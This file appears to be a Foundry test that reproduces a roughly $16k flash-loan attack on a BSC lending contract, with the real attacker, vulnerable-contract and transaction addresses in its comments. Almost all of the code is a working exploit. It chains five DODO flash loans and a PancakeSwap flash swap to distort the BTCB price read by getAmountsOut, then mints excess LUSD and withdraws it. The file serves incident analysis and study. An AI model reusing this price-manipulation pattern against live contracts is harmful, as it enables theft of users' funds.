// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~16k
// Attacker contract address : https://bscscan.com/address/0x21ad028c185ac004474c21ec5666189885f9e518
// Vulnerable contract : https://bscscan.com/address/0x637de69f45f3b66d5389f305088a38109aa0cf7c#code
// Attack TX : https://explorer.phalcon.xyz/tx/bsc/0x1eeef7b9a12b13f82ba04a7951c163eb566aa048050d6e9318b725d7bcec6bfa

// @Analysis : the loan contract use getAmountsOut to calculate how many lusd should be mint,and the hacker manipulate the BTCB-BSC-USD pool,
// borrow 1BTC and return 800k BSC-USD,so the loan contract will mint extra lusd。

//LUSD_POOL : 0x637de69f45f3b66d5389f305088a38109aa0cf7c
//LOAN ： 0xdec12a1dcbc1f741ccd02dfd862ab226f6383003

interface LOAN {
    function supply(address supplyToken, uint256 supplyAmount) external;
}

interface LUSDPOOL {
    function withdraw(uint256 amount) external;
}

contract LUSDTEST is Test {
    IERC20 BEP20USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 LUSD = IERC20(0x3cD632C25A4Db4c1A636cFb23B9285Be1097A60d);
    LOAN LOAN_ADDRESS = LOAN(0xdeC12a1dCbC1F741cCD02dFd862ab226F6383003);
    LUSDPOOL POOL_ADDRESS = LUSDPOOL(0x637De69F45F3b66D5389F305088A38109aA0cf7C);
    IDPPOracle DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair CakeLP = IPancakePair(payable(0x3F803EC2b816Ea7F06EC76aA2B6f2532F9892d62));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_756_866);
        cheats.label(address(BEP20USDT), "BEP20USDT");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(Router), "Router");
        cheats.label(address(CakeLP), "CakeLP");
    }

    function testSkim() public {
        deal(address(BEP20USDT), address(this), 0);
        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance before attack", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()
        );

        takeFlashloan(DPPOracle1);

        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance after attack", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            takeFlashloan(DPPOracle2);
        } else if (msg.sender == address(DPPOracle2)) {
            takeFlashloan(DPPOracle3);
        } else if (msg.sender == address(DPPOracle3)) {
            takeFlashloan(DPP);
        } else if (msg.sender == address(DPP)) {
            takeFlashloan(DPPAdvanced);
        } else {
            BEP20USDT.approve(address(Router), type(uint256).max);

            CakeLP.swap(0, 1_246_953_598_313_175_025, address(this), "0x0");
            BTCB.approve(address(LOAN_ADDRESS), type(uint256).max);
            LOAN_ADDRESS.supply(address(BTCB), 1_515_366_635_982_742);
            LUSD.approve(address(POOL_ADDRESS), type(uint256).max);
            POOL_ADDRESS.withdraw(LUSD.balanceOf(address(this)));
            BTCB.transfer(address(CakeLP), BTCB.balanceOf(address(this)));
            CakeLP.swap(799_764_317_883_596_339_564_612, 0, address(this), "");
        }
        //Repaying DPPOracle flashloans
        BEP20USDT.transfer(msg.sender, quoteAmount);
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        //Repaying CakeLP (Pair) flashswap
        BEP20USDT.transfer(address(CakeLP), 800_000 ether);
    }

    function takeFlashloan(IDPPOracle Oracle) internal {
        Oracle.flashLoan(0, BEP20USDT.balanceOf(address(Oracle)), address(this), new bytes(1));
    }
}
